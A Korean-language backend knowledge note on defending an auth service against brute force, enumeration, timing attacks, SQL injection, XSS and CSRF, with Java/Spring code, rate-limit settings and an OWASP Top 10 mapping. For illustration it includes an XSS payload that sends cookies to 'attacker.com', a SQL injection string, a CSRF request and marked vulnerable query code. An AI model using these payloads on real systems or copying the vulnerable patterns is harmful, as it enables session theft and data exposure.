---
title: "공격 방어 — enumeration / brute force / OWASP Top 10"
kind: knowledge
project: backend
agent: engineering-agent/tech-lead
status: current
created_at: 2026-05-15T05:30:00+09:00
tags:
  - backend
  - java-spring
  - api-design
  - auth
  - security
  - owasp
  - rate-limit
---

# 공격 방어 — enumeration / brute force / OWASP Top 10

**[[security|↑ security hub]]**

> auth 도메인의 주요 공격 종류 + 방어 수단. **다층 방어** — 한 layer 우회 시 다음 layer 가 잡음.

---

## 1. 공격 종류 + 방어

| 공격 | 무엇 | 방어 |
| --- | --- | --- |
| Brute force (login) | 비밀번호 추측 | Rate limit + account lock + Argon2id |
| Credential stuffing | 다른 사이트 유출 비번 시도 | Pwned check + 2FA + 의심 IP 감지 |
| User enumeration | 가입자 list 추측 | 응답 통일 + rate limit |
| Timing attack | 응답 시간으로 추측 | dummy hash + constant-time compare |
| SQL injection | DB 쿼리 조작 | JPA parameterized + 입력 검증 |
| XSS | 악의적 JS 삽입 | CSP + output escape |
| CSRF | cross-site 요청 | SameSite + CSRF token |
| Session fixation | 도난 토큰 사용 | rotation + reuse detection |
| Token replay | 옛 토큰 재사용 | jti + 짧은 TTL |
| Phishing | 가짜 사이트 | HTTPS + WebAuthn (미래) |

---

## 2. Brute Force 방어 — 다층

### 2.1 Argon2id (1차)

- 검증 100-300ms / 회 → 분당 200-600 회 시도 가능.
- 8자 영숫자 = 약 200조 조합 → 600/분 = 11,000년+.

자세히: [[../design-decisions/password-hash]].

### 2.2 Rate Limit (2차)

```yaml
login:
  per-IP: 5/min
  per-IP-cooldown: 1h after 5 fail
  per-email: 5/min
```

**왜 IP + email 둘 다**
- IP 만 → NAT 환경에서 정상 사용자 영향.
- email 만 → 분산 IP 로 우회 가능.
- 둘 다 = 정상 사용자 영향 ↓ + brute force 차단.

### 2.3 Account Lock (3차)

```java
public boolean login(String email, String password) {
    var user = users.findByEmail(email).orElse(null);
    if (user == null) {
        encoder.matches(password, DUMMY_HASH);   // timing 균일화
        return false;
    }

    var failures = loginFailureRepo.countRecentByUserId(user.id(), Duration.ofMinutes(15));
    if (failures >= 5) throw new AccountLockedException();    // 15분 lock

    if (!encoder.matches(password, user.passwordHash().value())) {
        loginFailureRepo.record(user.id(), Instant.now());
        return false;
    }

    loginFailureRepo.clearFor(user.id());
    return true;
}
```

**왜 5회 / 15분**
- 5회 = 사용자 오타 허용.
- 15분 lock = brute force 사실상 불가능 (분당 5회).

### 2.4 CAPTCHA (4차)

- 가입 / login 시 reCAPTCHA / hCaptcha.
- 봇 차단.
- 단 UX 부담 → 어뷰즈 폭증 시 활성.

---

## 3. Credential Stuffing 방어

### 3.1 무엇

- 공격자가 다른 사이트 유출 비번 list (수억) 으로 우리 사이트에서 시도.
- 사용자가 같은 비번 재사용 시 즉시 탈취.

### 3.2 방어 수단

1. **Pwned check** — 가입 / 변경 시 유출 비번 reject.
2. **2FA** — 비밀번호 외 추가 인증.
3. **의심 IP 감지** — 평소와 다른 IP / 디바이스 → 추가 인증.

자세히: [[password-policy#5]] · [[../design-decisions/two-factor-auth-policy]].

---

## 4. User Enumeration 방어

자세히: [[../design-decisions/enumeration-policy]].

**구현 핵심**
- 일반 SaaS — 직관적 (409) + rate limit + CAPTCHA fallback.
- 금융 / 의료 — 응답 통일 (모든 응답 같음).

---

## 5. Timing Attack 방어

### 5.1 무엇

- 응답 시간 차이로 정보 추측.
- 예: "user 없음" 5ms vs "비밀번호 틀림" 200ms → user 존재 enumeration.

### 5.2 방어

```java
public boolean login(String email, String password) {
    var user = users.findByEmail(email).orElse(null);

    if (user == null) {
        // user 없어도 dummy hash 검증 — 같은 시간 소비
        encoder.matches(password, DUMMY_ARGON2_HASH);
        return false;
    }
    return encoder.matches(password, user.passwordHash().value());
}

private static final String DUMMY_ARGON2_HASH =
    "$argon2id$v=19$m=65536,t=3,p=4$..."; // 한 번만 hash, 상수 저장
```

**왜 DUMMY hash**
- user 없으면 hash 검증 없이 즉시 응답 → 시간 차이.
- DUMMY hash 검증 = 같은 ~200ms 소비.

### 5.3 String compare

```java
// ❌ timing leak
if (token.equals(expected)) ...     // 처음부터 다르면 빨리 종료

// ✅ constant-time
MessageDigest.isEqual(tokenBytes, expectedBytes)
```

**왜**
- `String.equals` 가 첫 글자 다르면 즉시 false → 응답 빠름.
- 공격자가 byte 단위 추측.
- `MessageDigest.isEqual` = 항상 모든 byte 비교.

---

## 6. SQL Injection 방어

### 6.1 무엇

```sql
-- 사용자 입력: email = "' OR 1=1 --"
SELECT * FROM users WHERE email = '' OR 1=1 --';  -- 모든 user 반환
```

### 6.2 방어

```java
// ✅ JPA parameterized (안전)
@Query("SELECT u FROM UserJpaEntity u WHERE u.email = :email")
Optional<User> findByEmail(@Param("email") String email);

// ❌ 문자열 concatenation (위험)
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
```

**왜 JPA / Prepared Statement**
- parameter 가 PreparedStatement 의 `?` 로 바인딩.
- DB driver 가 escape — SQL keyword 안 통함.

### 6.3 MyBatis 도 마찬가지

```xml
<!-- ✅ # — prepared -->
<select id="findByEmail">
    SELECT * FROM users WHERE email = #{email}
</select>

<!-- ❌ $ — 문자열 치환 -->
<select id="findByEmail">
    SELECT * FROM users WHERE email = '${email}'
</select>
```

**`#` vs `$`**
- `#{}` = PreparedStatement parameter (안전).
- `${}` = 문자열 치환 (SQL injection 위험).

---

## 7. XSS 방어

### 7.1 무엇

- 악의적 user 가 HTML / JS 입력 → 다른 user 화면에서 실행.
- 예: review content 에 `<script>fetch('//attacker.com', { cookie })</script>`.

### 7.2 방어

1. **Output escape** — JSON 응답은 자동 (Jackson).
2. **Input sanitization** — HTML 허용 필드 (review content 등) 는 OWASP Java HTML Sanitizer.
3. **CSP 헤더** — `Content-Security-Policy: default-src 'self'`.

```java
import org.owasp.html.HtmlPolicyBuilder;

PolicyFactory POLICY = new HtmlPolicyBuilder()
    .allowElements("b", "i", "em", "strong", "p", "br")
    .toFactory();

String safeHtml = POLICY.sanitize(userInputHtml);
```

---

## 8. CSRF 방어

### 8.1 무엇

- 악의적 site 가 사용자 cookie 로 우리 API 호출.
- 예: `<img src="https://yule.com/api/transfer?amount=1000">` → 사용자 cookie 자동.

### 8.2 방어

1. **JWT in Authorization header** — cookie 의존 X, browser 가 자동 cross-origin header 안 보냄.
2. **SameSite cookie** — `SameSite=Strict` → cross-site 요청에 cookie 안 포함.
3. **CSRF token** — cookie + form data 모두 일치 검증.

본 vault: **access JWT in header** + **refresh in SameSite=Strict cookie**.

---

## 9. OWASP Top 10 (2021) 매핑

| OWASP | 본 vault 대응 |
| --- | --- |
| A01 Broken Access Control | [[authentication-authorization]] — 명시적 권한 매트릭스 |
| A02 Cryptographic Failures | [[../design-decisions/password-hash]] argon2id + [[../database/encryption-at-rest]] |
| A03 Injection | JPA parameterized + Bean Validation + 도메인 VO |
| A04 Insecure Design | 도메인 모델 + 상태머신 + threat model |
| A05 Security Misconfiguration | STATELESS + CORS 화이트리스트 + CSP + secret manager |
| A06 Vulnerable Components | OWASP Dependency Check + Renovate |
| A07 Identification & Auth | enumeration 방어 + rate limit + 2FA + lock |
| A08 Software & Data Integrity | PHC 형식 검증 + JWT 서명 검증 + audit log |
| A09 Logging Failures | [[audit-logging]] — 가입 / login / password 변경 audit |
| A10 SSRF | URL 검증 + 허용된 host 만 |

---

## 10. Rate Limit 종합

```yaml
rate-limit:
  signup:
    per-IP: 3/hour
    per-IP-cooldown: 1day after 10 fail
  login:
    per-IP: 5/min
    per-email: 5/min
    per-email-lock: 15min after 5 fail
  password-reset:
    per-IP: 3/hour
    per-email: 1/hour
  sms-verification:
    per-phone: 5/hour
    per-phone-cooldown: 60s between requests
  email-verification-resend:
    per-user: 3/hour
```

**왜 endpoint 별 다른 정책**
- signup = 어뷰즈 폭증 위험 → 짧은 한도.
- login = brute force 위험 → IP + email 둘 다.
- sms = 비용 critical → 60s cooldown.

자세히: [[../../rate-limiting]].

---

## 11. 함정 모음

### 함정 1 — Rate limit 만 (Argon2id 약한 params)
공격자가 분당 100 시도 가능 → 1년 brute force.
→ argon2id m=64MB+.

### 함정 2 — Account lock 없음
무제한 시도.
→ 5회 lock.

### 함정 3 — IP rate limit 만 (email 무시)
분산 IP 로 우회.
→ IP + email 둘 다.

### 함정 4 — Lock 이 IP 별 (user 별 아님)
정상 사용자 (NAT) 가 다른 user 의 abuse 로 lock.
→ user 별 lock + IP 별 rate limit 분리.

### 함정 5 — Timing attack 무방비
"user 없음" 빠른 응답 = enumeration.
→ DUMMY hash 검증.

### 함정 6 — String.equals 토큰 검증
첫 글자 다르면 빠른 응답.
→ MessageDigest.isEqual.

### 함정 7 — SQL `LIKE` 사용자 입력 그대로
`%` 와 `_` escape 안 함 → 검색 폭증.
→ `escape` 처리.

### 함정 8 — XSS sanitize 없음 (review 등)
악의적 HTML / JS 다른 user 영향.
→ OWASP HTML Sanitizer.

### 함정 9 — CSP 없음
XSS 발생 시 mitigation 없음.
→ `Content-Security-Policy: default-src 'self'`.

### 함정 10 — CSRF 무시 (cookie 사용 중)
cross-site 요청 통과.
→ SameSite + CSRF token.

### 함정 11 — Log4Shell 같은 dependency CVE 미감지
자동 적용 안 함.
→ OWASP Dependency Check + Renovate.

### 함정 12 — IP 추출 잘못 (X-Forwarded-For)
CDN / proxy 뒤 → 모든 사용자가 같은 IP.
→ Spring `forward-headers-strategy: framework`.

---

## 12. 관련

- [[security|↑ security hub]]
- [[../design-decisions/enumeration-policy]]
- [[../design-decisions/two-factor-auth-policy]]
- [[../../rate-limiting]] — Bucket4j + Redis
- [[../login-impl]] · [[../signup-impl]]
- 외부 — OWASP Top 10 (2021), OWASP Authentication Cheat Sheet
